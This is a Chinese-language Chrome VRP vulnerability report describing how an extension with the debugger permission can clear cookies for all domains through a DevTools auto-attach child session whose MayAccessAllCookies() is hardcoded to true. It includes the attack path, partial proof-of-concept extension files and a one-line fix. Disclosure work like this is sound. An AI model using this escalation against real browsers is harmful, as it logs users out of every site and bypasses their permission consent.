# VRP 报告: 扩展通过 DevTools Auto-Attach 子 Session 获得全局 Cookie 删除权限

## 1. 漏洞详情

### 类型
逻辑漏洞 — DevTools Protocol auto-attach 子 session 权限委托不一致，导致扩展突破 host_permissions 声明的域名范围

### 影响组件
`content/browser/devtools/protocol/target_handler.cc:618`

### 漏洞仓库地址（代码位置）

| 文件 | 行号 | 作用 |
|------|------|------|
| `content/browser/devtools/protocol/target_handler.cc` | 618 | **BUG**: `MayAccessAllCookies()` 硬编码返回 `true` |
| `content/browser/devtools/protocol/target_handler.cc` | 620-636 | 正确模式：其他 5 个方法都委托给 `GetRootClient()` |
| `content/browser/devtools/protocol/network_handler.cc` | 2494-2515 | `ClearCookies` 根据 `MayAccessAllCookies()` 选择路径 |
| `chrome/browser/extensions/api/debugger/debugger_api.cc` | 670-672 | 扩展正确返回 `false` |
| `content/public/browser/devtools_agent_host_client.cc` | 44-47 | 基类注释：扩展应保持默认 `false` |

### 漏洞原理

`TargetHandler::Session` 是 CDP auto-attach 子 session 的 `DevToolsAgentHostClient` 实现。当扩展使用 `Target.setAutoAttach({flatten: true})` 时，子目标（Service Worker、iframe 等）会自动附加，为每个子目标创建一个 `Session` 对象作为其 `DevToolsAgentHostClient`。

该 `Session` 类覆写了 6 个权限方法。其中 5 个正确委托给根客户端：

```cpp
// target_handler.cc:620-636 — 正确的委托模式:
bool MayAttachToURL(const GURL& url, bool is_webui) override {
    return GetRootClient()->MayAttachToURL(url, is_webui);  // ✓
}
bool IsTrusted() override { return GetRootClient()->IsTrusted(); }  // ✓
bool MayReadLocalFiles() override { return GetRootClient()->MayReadLocalFiles(); }  // ✓
bool MayWriteLocalFiles() override { return GetRootClient()->MayWriteLocalFiles(); }  // ✓
bool AllowUnsafeOperations() override { return GetRootClient()->AllowUnsafeOperations(); }  // ✓
```

**唯独 `MayAccessAllCookies()` 硬编码返回 `true`：**

```cpp
// target_handler.cc:618 — BUG:
bool MayAccessAllCookies() override { return true; }  // ✗ 不委托！
```

**而扩展的根客户端明确返回 `false`：**

```cpp
// chrome/browser/extensions/api/debugger/debugger_api.cc:670-672
bool ExtensionDevToolsClientHost::MayAccessAllCookies() {
  return false;  // 扩展不应该有全局 cookie 访问权
}
```

### 攻击路径

```
Extension 调用 chrome.debugger.attach(tabId)
  → Extension 发送 Target.setAutoAttach({autoAttach: true, flatten: true})
  → 子目标自动附加（SW, iframe 等）
  → TargetHandler::Session 创建，作为子目标的 DevToolsAgentHostClient
  → Extension 在子 session 上发送 Network.clearBrowserCookies
  → NetworkHandler::ClearCookies 检查 client.MayAccessAllCookies()
  → Session.MayAccessAllCookies() 返回 true（BUG）
  → 进入原子删除路径：cookie_manager->DeleteCookies(空 filter)
  → 所有域名的所有 cookie 被删除
```

**对比正常行为（父 session）：**
```
Extension 在父 session 发送 Network.clearBrowserCookies
  → NetworkHandler::ClearCookies 检查 client.MayAccessAllCookies()
  → ExtensionDevToolsClientHost 返回 false
  → 进入过滤路径：GetAllCookies → 逐个检查 CanAccessCookie → MayAttachToURL
  → 只删除 host_permissions 匹配域名的 cookie
```

---

## 2. 漏洞影响

### 前提条件

| 条件 | 详情 |
|------|------|
| **扩展权限** | `"debugger"` permission |
| **host_permissions** | 可以是任意有限范围（如仅 `*://*.example.com/*`） |
| **用户交互** | 附加调试器时显示信息栏 |
| **企业场景** | 策略安装扩展：无信息栏，完全静默 |
| **目标页面** | 需有子目标（Service Worker、iframe 等） |

### 效果

| 影响维度 | 描述 |
|---------|------|
| **权限提升** | 扩展突破 `host_permissions` 声明的域名范围限制 |
| **破坏性** | 原子性删除所有域名的所有 cookie（不可撤销） |
| **用户影响** | 所有网站同时登出（银行、邮件、社交、企业应用） |
| **CSRF 防护破坏** | 所有站点的 CSRF token 失效 |
| **信任欺骗** | 用户看到的权限声明（仅 example.com）≠ 实际能力（所有域名） |
| **Session 劫持配合** | 删除 cookie 后配合钓鱼页面可重新捕获凭证 |

### 为什么这是真正的权限提升（不同于 Finding 246）

- **不是 "debugger 已经能做" 的问题** — debugger 权限受 `host_permissions` 限制
- 父 session 正确执行了 `host_permissions` 过滤（只删 example.com 的 cookie）
- 子 session 因为一个 hardcoded `true` 跳过了所有过滤
- 这是用户同意范围（example.com）与实际影响（所有域名）的明确差异

### 严重性: Medium-High (Privilege Escalation + Destructive + User Consent Violation)

---

## 3. 复现方式

### 环境准备

- **Chrome 版本**: Chrome stable（任何近期版本）
- **操作系统**: Windows / macOS / Linux
- **无需特殊 flag**
- **需要**: 一个有 Service Worker 的网站（如 gmail.com、youtube.com、twitter.com）

### Step 1: 创建 PoC 扩展

创建文件夹 `cookie_escalation_extension/`，包含 4 个文件：

#### manifest.json
```json
{
  "manifest_version": 3,
  "name": "Cookie Escalation PoC",
  "version": "1.0",
  "description": "Demonstrates MayAccessAllCookies bypass via auto-attached child session",
  "permissions": ["debugger", "activeTab"],
  "host_permissions": ["*://*.example.com/*"],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_popup": "popup.html",
    "default_title": "Cookie Escalation PoC"
  }
}
```

**关键**: `host_permissions` 仅限 `*.example.com`。按设计，此扩展只能操作 example.com 的 cookie。

#### popup.html
```html
<!DOCTYPE html>
<html>
<head>
  <style>
    body { width: 480px; padding: 16px; font-family: monospace; font-size: 13px; }
    h2 { margin: 0 0 8px 0; font-size: 15px; }
    #log { background: #111; color: #0f0; padding: 10px; height: 300px; overflow-y: auto; white-space: pre-wrap; border-radius: 4px; }
    button { margin-top: 10px; padding: 8px 16px; cursor: pointer; font-size: 13px; }
    .fail { color: #f44; }
    .ok { color: #4f4; }
    .info { color: #ff0; }
  </style>
</head>
<body>
  <h2>Cookie Escalation PoC (Finding 245)</h2>
  <p>host_permissions: only *.example.com</p>
  <div id="log"></div>
  <button id="run">Run Exploit</button>
  <script src="popup.js"></script>
</body>
</html>
```

#### popup.js
```javascript
const logEl = document.getElementById('log');
function log(msg, cls) {
  const span = document.createElement('span');
  span.className = cls || '';
  span.textContent = msg + '\n';
  logEl.appendChild(span);
  logEl.scrollTop = logEl.scrollHeight;
}
function renderLogs(logs) {
  logEl.innerHTML = '';
  logs.forEach(l => log(l.msg, l.cls));
}
document.getElementById('run').addEventListener('click', async () => {
  logEl.innerHTML = '';
  log("Starting exploit via background service worker...", "info");
  const [tab] = await chrome.tabs.query({active: true, currentWindow: true});
  if (!tab) { log("No active tab", "fail"); return; }
  chrome.runtime.sendMessage(
    {action: "run", tabId: tab.id, url: tab.url},
    (response) => { if (response && response.logs) renderLogs(response.logs); }
  );
  let pollCount = 0;
  const poll = setInterval(() => {
    chrome.runtime.sendMessage({action: "getLogs"}, (response) => {
      if (response && response.logs && response.logs.length > 0) renderLogs(response.logs);
    });
    if (++pollCount > 30) clearInterval(poll);
  }, 1000);
});
chrome.runtime.sendMessage({action: "getLogs"}, (response) => {
  if (response && response.logs && response.logs.length > 0) renderLogs(response.logs);
});
```

#### background.js
（见 PoC 文件夹中的完整实现）

核心逻辑：
1. 附加调试器到目标 tab
2. 启用 `Target.setAutoAttach({flatten: true})`
3. 注入 iframe 触发子目标自动附加
4. 获取子 session 的 sessionId
5. 在子 session 上调用 `Network.clearBrowserCookies`
6. 验证所有域名 cookie 被清除

### Step 2: 安装扩展

1. `chrome://extensions/` → 开发者模式 → 加载已解压扩展
2. 选择 `cookie_escalation_extension/` 文件夹

### Step 3: 准备验证环境

1. 登录多个网站（Gmail、GitHub、YouTube 等）
2. 打开 `chrome://settings/cookies/all`（或 `chrome://settings/siteData`）确认有多个域名的 cookie
3. 导航到一个有 Service Worker 的网站（如 youtube.com、gmail.com）

### Step 4: 执行验证

1. 在目标页面（如 youtube.com）点击扩展图标
2. 点击 "Run Exploit"
3. 允许调试器信息栏
4. 观察日志输出

### Step 5: 验证结果

**漏洞存在的标志:**
- `[5] clearBrowserCookies on CHILD session SUCCEEDED!`
- `[6] Cookies remaining: 0`（或接近 0）
- 刷新其他标签页 → 所有网站要求重新登录

**对比验证（证明 bug 在子 session）:**
- 如果没获取到子 session，PoC 会退回到父 session 演示
- 父 session 的 clearBrowserCookies 只清除 example.com 的 cookie
- 其他网站的 cookie 保持不变

**如果没有子目标:**
- 在 youtube.com / gmail.com / twitter.com 上测试（有 Service Worker）
- 或手动打开有 cross-origin iframe 的页面

---

## 4. 设备指纹

| 字段 | 值 |
|------|-----|
| **Chrome 版本** | 所有支持 Target.setAutoAttach 的版本 (Chrome 63+) |
| **构建类型** | Release (production) |
| **平台** | All (Windows/macOS/Linux/ChromeOS) |
| **所需 Flag** | 无 |
| **所需权限** | Extension with `debugger` permission |
| **影响渠道** | Stable, Beta, Dev, Canary |
| **用户交互** | 调试器信息栏（策略安装跳过） |
| **网络要求** | 无 |
| **Renderer Compromise** | 不需要 |

### 攻击场景

| 场景 | 信息栏? | 用户交互? |
|------|---------|----------|
| 用户安装的扩展 | 是 | 一次性允许 |
| 策略安装扩展 (`force_installed`) | **否** | **无** |
| `--silent-debugging` 命令行 | **否** | **无** |

---

## 5. 建议修复

### One-line fix:

```cpp
// content/browser/devtools/protocol/target_handler.cc:618
// Before:
bool MayAccessAllCookies() override { return true; }

// After:
bool MayAccessAllCookies() override { return GetRootClient()->MayAccessAllCookies(); }
```

### 修复验证

修复后的行为链：
- `GetRootClient()` → 扩展的 `ExtensionDevToolsClientHost`
- `ExtensionDevToolsClientHost::MayAccessAllCookies()` → `false`
- `NetworkHandler::ClearCookies` → 进入过滤路径
- 只有 `host_permissions` 匹配的域名的 cookie 被删除

---

## 6. 相关引用

- `content/browser/devtools/protocol/target_handler.cc:618` — Bug（硬编码 `true`）
- `content/browser/devtools/protocol/target_handler.cc:620-636` — 正确模式（全部委托）
- `content/browser/devtools/protocol/network_handler.cc:2494-2515` — `ClearCookies` 分支
- `chrome/browser/extensions/api/debugger/debugger_api.cc:670-672` — 扩展返回 `false`
- `content/public/browser/devtools_agent_host_client.cc:44-47` — 文档化意图
- `content/browser/devtools/devtools_session.h:221,224` — Network+Target 对扩展可用
